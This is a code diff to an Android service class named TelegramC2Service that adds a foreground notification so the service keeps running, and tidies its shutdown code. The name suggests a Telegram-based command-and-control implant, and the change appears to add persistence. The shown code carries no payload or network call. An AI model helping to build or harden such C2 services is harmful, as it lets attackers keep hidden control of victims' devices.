@@ -1,13 +1,16 @@
 package com.chimera;
 
+import android.app.Notification;
+import android.app.NotificationChannel;
+import android.app.NotificationManager;
 import android.app.Service;
 import android.content.Intent;
+import android.os.Build;
 import android.os.IBinder;
-import android.os.Handler;
-import android.os.Looper;
 
 public class TelegramC2Service extends Service {
     private Thread workerThread;
+    private static final String CHANNEL_ID = "chimeraChannel";
 
     @Override
     public void onCreate() {
@@ -15,9 +18,33 @@ public class TelegramC2Service extends Service {
         try {
             ConfigLoader.load(this);
         } catch (Exception e) {}
+        createNotifChannel();
+        startForeground(1, createNotification());
         try {
             startWorker();
         } catch (Exception e) {}
+    }
+
+    private void createNotifChannel() {
+        try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                NotificationChannel chan = new NotificationChannel(CHANNEL_ID, "Chimera Service", NotificationManager.IMPORTANCE_LOW);
+                NotificationManager nm = getSystemService(NotificationManager.class);
+                nm.createNotificationChannel(chan);
+            }
+        } catch (Exception e) {}
+    }
+
+    private Notification createNotification() {
+        Notification.Builder b;
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            b = new Notification.Builder(this, CHANNEL_ID);
+        } else {
+            b = new Notification.Builder(this);
+        }
+        b.setContentTitle("Chimera Running");
+        b.setSmallIcon(android.R.drawable.stat_notify_sync);
+        return b.build();
     }
 
     private void startWorker() {
@@ -40,9 +67,7 @@ public class TelegramC2Service extends Service {
     @Override
     public void onDestroy() {
         try {
-            if (workerThread != null) {
-                workerThread.interrupt();
-            }
+            if (workerThread != null) workerThread.interrupt();
         } catch (Exception e) {}
         super.onDestroy();
     }
